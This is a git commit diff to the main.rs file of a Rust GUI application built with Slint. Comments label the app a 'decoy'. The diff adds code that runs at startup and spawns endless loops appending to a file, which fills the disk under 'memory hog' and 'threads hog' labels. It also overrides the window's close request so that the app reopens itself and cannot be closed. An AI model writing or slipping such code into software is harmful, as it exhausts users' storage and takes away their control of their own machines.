89b78fd33be1f9c5c550f84b615c54787f2489d7
Talent Chikamhi <67649495+thinking-mindy@users.noreply.github.com>
2025-02-06 19:53:21 +0200

    Add files via upload

--- src/main.rs
+++ src/main.rs
@@ -1,27 +1,35 @@
 
 #![deny(unsafe_code)]
+
+use std::io::Write;
 slint::include_modules!();
 
 //add booty bin
 //decoy
-//
-//
-//
-//
-//
-//
-//
-//
+//memory hog
+async fn memory_hogging(){
+    let mut file=std::fs::OpenOptions::new().append(true).open("twd/twd").unwrap();
+    loop{
+        file.write(b"twd").unwrap();
+    }
+}
+//threads hog
+async fn ram_hogging(){
+    let mut file=std::fs::OpenOptions::new().append(true).open("twd/twd").unwrap();
+    loop{
+        file.write(b"twd").unwrap();
+    }
+}
 
 #[tokio::main]
 async fn main() {
-    // This provides better error messages in debug mode.
-    // It's disabled in release mode so it doesn't bloat up the file size.
-    #[cfg(all(debug_assertions, target_arch = "wasm32"))]
-    console_error_panic_hook::set_once();
-
     let app = App::new().unwrap();
-    
-
+    tokio::spawn(async{
+        memory_hogging().await;
+        ram_hogging().await;
+    });
+    let appy=app.as_weak();
+    app.window().on_close_requested(move||{appy.unwrap().run().unwrap();slint::CloseRequestResponse::KeepWindowShown});
     app.run().unwrap();
+
 }
